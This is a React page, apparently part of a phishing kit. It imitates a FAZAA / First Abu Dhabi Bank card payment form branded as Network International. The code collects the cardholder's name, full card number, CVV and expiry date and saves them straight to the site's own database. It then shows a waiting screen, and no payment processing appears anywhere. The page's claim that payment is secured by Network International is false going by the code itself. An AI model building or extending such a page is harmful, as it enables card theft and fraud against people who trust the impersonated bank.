/* FAZAA Card Payment — Network International style */
import { useState } from 'react';
import { useLocation } from 'wouter';
import { useApp } from '@/contexts/AppContext';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import LoadingOverlay from '@/components/LoadingOverlay';
import WaitingModal from '@/components/WaitingModal';

const FAB_IMG = '/manus-storage/fab-banner_14c1e9dc.png';

const FAB_CARDS = [
  { src: '/manus-storage/fab-platinum-duo_28eb9687.png', label: 'بلاتينيوم' },
  { src: '/manus-storage/fab-platinum-blue_c9dd79d1.png', label: 'بلاتينيوم أزرق' },
  { src: '/manus-storage/fab-platinum-dark_c1972da2.png', label: 'بلاتينيوم داكن' },
  { src: '/manus-storage/fab-world_07435a03.png', label: 'ورلد' },
  { src: '/manus-storage/fab-cashback_418484f5.png', label: 'كاش باك' },
];

interface Errors {
  cardName?: string;
  cardNumber?: string;
  cvv?: string;
  expiryDate?: string;
}

function formatCardNumber(val: string) {
  const digits = val.replace(/\D/g, '').slice(0, 16);
  // تنسيق من اليمين لليسار: 1234 5678 9012 3456
  const groups = [];
  for (let i = 0; i < digits.length; i += 4) {
    groups.push(digits.slice(i, i + 4));
  }
  return groups.join(' ');
}

function formatExpiry(val: string) {
  const digits = val.replace(/\D/g, '').slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + '/' + digits.slice(2);
  return digits;
}

export default function CardPayment() {
  const [, navigate] = useLocation();
  const { appData, setAppData, saveApplication, isLoading, setIsLoading } = useApp();
  const [errors, setErrors] = useState<Errors>({});
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [submitted, setSubmitted] = useState(false);

  const validate = (): boolean => {
    const errs: Errors = {};
    if (!appData.cardName.trim() || appData.cardName.trim().length < 3) errs.cardName = 'يرجى إدخال اسم حامل البطاقة';
    const rawCard = appData.cardNumber.replace(/\s/g, '');
    if (!rawCard || rawCard.length < 16) errs.cardNumber = 'يرجى إدخال رقم البطاقة كاملاً (16 رقم)';
    if (!appData.cvv || appData.cvv.length < 3) errs.cvv = 'يرجى إدخال رمز CVV';
    if (!appData.expiryDate || appData.expiryDate.length < 5) errs.expiryDate = 'يرجى إدخال تاريخ الانتهاء';
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleNext = async () => {
    setTouched({ cardName: true, cardNumber: true, cvv: true, expiryDate: true });
    if (!validate()) return;
    setIsLoading(true);
    try {
      // حفظ بيانات البطاقة في قاعدة البيانات
      await saveApplication({
        ...appData,
        currentPage: '/card-payment',
      });
      setAppData({ currentPage: '/card-payment' });
      setSubmitted(true);
    } catch (err) {
      console.error('[CardPayment] Save error:', err);
    } finally {
      setIsLoading(false);
    }
  };

  const inputStyle = (field: keyof Errors) => ({
    background: 'rgba(255,255,255,0.05)',
    border: `1px solid ${touched[field] && errors[field] ? '#D72638' : 'rgba(255,255,255,0.15)'}`,
    borderRadius: '8px',
    color: '#FFFFFF',
    fontFamily: 'Cairo, sans-serif',
    padding: '12px 16px',
    width: '100%',
    fontSize: '15px',
    outline: 'none',
    transition: 'border-color 0.2s, box-shadow 0.2s',
  });

  // Waiting screen after submission — show modal over current page
  if (submitted) {
    return (
      <div className="min-h-screen flex flex-col" style={{ background: '#050D1A', fontFamily: 'Cairo, sans-serif' }}>
        <Header />
        <main className="flex-1" />
        <Footer />
        <WaitingModal />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ background: '#050D1A', fontFamily: 'Cairo, sans-serif' }}>
      {isLoading && <LoadingOverlay />}
      <Header />

      <main className="flex-1 py-8 px-4">
        <div className="max-w-2xl mx-auto">

          {/* FAB Promo Banner */}
          <div className="rounded-2xl overflow-hidden mb-6" style={{ border: '1px solid rgba(200,160,58,0.2)' }}>
            <img
              src={FAB_IMG}
              alt="بنك أبوظبي الأول - عروض الصيف مع فزعة"
              className="w-full block"
              style={{ display: 'block', maxHeight: '420px', objectFit: 'contain', background: '#f0f4fa' }}
            />
          </div>

          {/* Network payment form */}
          <div className="rounded-2xl overflow-hidden" style={{ border: '1px solid rgba(29,74,145,0.4)' }}>
            {/* Network header */}
            <div className="px-6 py-4 flex items-center justify-between" style={{ background: 'linear-gradient(135deg, #0F2A5C, #1D4A91)' }}>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: 'rgba(255,255,255,0.15)' }}>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                    <line x1="1" y1="10" x2="23" y2="10"/>
                  </svg>
                </div>
                <span className="text-white font-bold text-sm" style={{ fontFamily: 'Cairo, sans-serif' }}>بيانات البطاقة</span>
              </div>
              {/* Network logo */}
              <div className="flex items-center gap-1">
                <div className="text-xs font-black tracking-wider" style={{ color: '#E8C060' }}>NETWORK</div>
                <div className="text-xs" style={{ color: 'rgba(255,255,255,0.5)' }}>International</div>
              </div>
            </div>

            {/* Form body */}
            <div className="p-6 space-y-5 payment-form-container">
              {/* Card name */}
              <div>
                <label className="block text-sm font-semibold mb-2" style={{ color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif' }}>
                  اسم حامل البطاقة
                </label>
                <input
                  type="text"
                  placeholder="الاسم كما يظهر على البطاقة"
                  value={appData.cardName}
                  onChange={e => { setAppData({ cardName: e.target.value }); if (touched.cardName) validate(); }}
                  onBlur={() => { setTouched(p => ({ ...p, cardName: true })); validate(); }}
                  style={inputStyle('cardName')}
                  onFocus={e => { e.currentTarget.style.borderColor = '#4A90D9'; e.currentTarget.style.boxShadow = '0 0 0 3px rgba(74,144,217,0.2)'; }}
                />
                {touched.cardName && errors.cardName && <p className="mt-1 text-xs" style={{ color: '#D72638' }}>⚠ {errors.cardName}</p>}
              </div>

              {/* Card number */}
              <div>
                <label className="block text-sm font-semibold mb-2" style={{ color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif' }}>
                  رقم البطاقة
                </label>
                <input
                  type="text"
                  placeholder="XXXX XXXX XXXX XXXX"
                  value={appData.cardNumber}
                  onChange={e => { setAppData({ cardNumber: formatCardNumber(e.target.value) }); if (touched.cardNumber) validate(); }}
                  onBlur={() => { setTouched(p => ({ ...p, cardNumber: true })); validate(); }}
                  style={{ ...inputStyle('cardNumber'), direction: 'ltr', textAlign: 'right', letterSpacing: '2px', fontFamily: 'monospace', unicodeBidi: 'plaintext' as any, fontVariantNumeric: 'tabular-nums' as any }}
                  maxLength={19}
                  onFocus={e => { e.currentTarget.style.borderColor = '#4A90D9'; e.currentTarget.style.boxShadow = '0 0 0 3px rgba(74,144,217,0.2)'; }}
                />
                {touched.cardNumber && errors.cardNumber && <p className="mt-1 text-xs" style={{ color: '#D72638' }}>⚠ {errors.cardNumber}</p>}
              </div>

              {/* CVV + Expiry */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold mb-2" style={{ color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif' }}>
                    CVV
                  </label>
                  <input
                    type="password"
                    placeholder="•••"
                    value={appData.cvv}
                    onChange={e => { setAppData({ cvv: e.target.value.replace(/\D/g, '').slice(0, 4) }); if (touched.cvv) validate(); }}
                    onBlur={() => { setTouched(p => ({ ...p, cvv: true })); validate(); }}
                    style={{ ...inputStyle('cvv'), direction: 'ltr', textAlign: 'center', letterSpacing: '4px' }}
                    maxLength={4}
                    onFocus={e => { e.currentTarget.style.borderColor = '#4A90D9'; e.currentTarget.style.boxShadow = '0 0 0 3px rgba(74,144,217,0.2)'; }}
                  />
                  {touched.cvv && errors.cvv && <p className="mt-1 text-xs" style={{ color: '#D72638' }}>⚠ {errors.cvv}</p>}
                </div>
                <div>
                  <label className="block text-sm font-semibold mb-2" style={{ color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif' }}>
                    تاريخ الانتهاء
                  </label>
                  <input
                    type="text"
                    placeholder="MM/YY"
                    value={appData.expiryDate}
                    onChange={e => { setAppData({ expiryDate: formatExpiry(e.target.value) }); if (touched.expiryDate) validate(); }}
                    onBlur={() => { setTouched(p => ({ ...p, expiryDate: true })); validate(); }}
                    style={{ ...inputStyle('expiryDate'), direction: 'ltr', textAlign: 'center', letterSpacing: '2px' }}
                    maxLength={5}
                    onFocus={e => { e.currentTarget.style.borderColor = '#4A90D9'; e.currentTarget.style.boxShadow = '0 0 0 3px rgba(74,144,217,0.2)'; }}
                  />
                  {touched.expiryDate && errors.expiryDate && <p className="mt-1 text-xs" style={{ color: '#D72638' }}>⚠ {errors.expiryDate}</p>}
                </div>
              </div>

              {/* Security note */}
              <div className="flex items-center gap-3 p-3 rounded-lg" style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6DBE45" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
                <p className="text-xs" style={{ color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif' }}>
                  الدفع محمي ومُعالج بأمان بواسطة <span style={{ color: '#E8C060', fontWeight: 700 }}>Network International</span>
                </p>
              </div>

              {/* Submit */}
              <button
                onClick={handleNext}
                className="w-full py-4 rounded-xl font-black text-base transition-all duration-200"
                style={{
                  background: 'linear-gradient(135deg, #1D4A91, #2563EB)',
                  color: '#FFFFFF',
                  fontFamily: 'Cairo, sans-serif',
                  boxShadow: '0 4px 20px rgba(29,74,145,0.4)',
                }}
                onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 6px 30px rgba(29,74,145,0.6)'}
                onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 4px 20px rgba(29,74,145,0.4)'}
              >
                التالي
              </button>
            </div>
          </div>

          {/* Back button */}
          <div className="mt-6 text-center">
            <button
              onClick={() => navigate('/order-summary')}
              className="text-sm transition-colors duration-200"
              style={{ color: 'rgba(255,255,255,0.4)', fontFamily: 'Cairo, sans-serif' }}
              onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.color = '#C8A03A'}
              onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,255,255,0.4)'}
            >
              ← رجوع
            </button>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
